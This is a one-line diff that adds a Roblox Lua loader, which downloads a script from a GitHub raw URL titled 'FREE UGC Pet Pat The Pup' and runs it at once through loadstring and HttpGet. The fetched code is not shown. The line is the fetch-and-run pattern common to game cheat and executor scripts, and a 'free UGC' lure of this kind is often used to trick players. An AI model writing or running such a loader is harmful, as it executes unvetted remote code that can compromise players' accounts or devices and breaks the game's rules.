@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Imalwibest/Imalwibest/refs/heads/main/FREE%20UGC%20Pet%20Pat%20The%20Pup.lua"))()
